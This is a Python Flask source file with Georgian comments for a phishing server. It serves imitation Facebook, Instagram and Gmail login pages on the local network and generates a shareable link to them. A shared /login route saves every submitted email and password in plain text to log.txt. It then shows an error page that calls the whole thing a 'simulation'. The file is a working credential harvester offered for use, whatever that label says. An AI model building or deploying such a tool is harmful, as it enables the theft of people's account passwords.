from flask import Flask, render_template, request
import socket
from datetime import datetime

app = Flask(__name__)

# მთავარი მენიუ
@app.route('/')
def home():
    generated_link = None
    platform = request.args.get('platform')

    if platform:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
        s.close()

        generated_link = f"http://{local_ip}:5000/{platform}"

    return render_template('menu.html', link = generated_link)

# ფეისბუქი
@app.route('/facebook')
def facebook():
    return render_template('facebook.html')

# ინსტაგრამი
@app.route('/instagram')
def instagram():
    return render_template('instagram.html')

# მეილი
@app.route('/gmail')
def gmail():
    return render_template('gmail.html')

# მონაცემების მიღება (სამივე საიტი აქ გამოაგზავნის პაროლებს)
@app.route('/login', methods=['POST'])
def login():
    platform = request.form.get('platform')
    email = request.form.get('email')
    password = request.form.get('password') 
    time = datetime.now().strftime('%Y-%m-%d %H:%M::%S')

    #log.txt
    with open('log.txt', 'a', encoding='utf-8') as f:
        f.write(f"[{time}] [{platform}] Email: {email} | Password: {password}\n")

    return "<h1>სისტემური შეცდომა!</h1><p>ეს არის სიმულაცია. მონაცემები ჩაიწერა log.txt-ში.</p>"

if __name__ == '__main__':
    #წვდომა ქსელში
    app.run(host='0.0.0.0', port=5000, debug=True)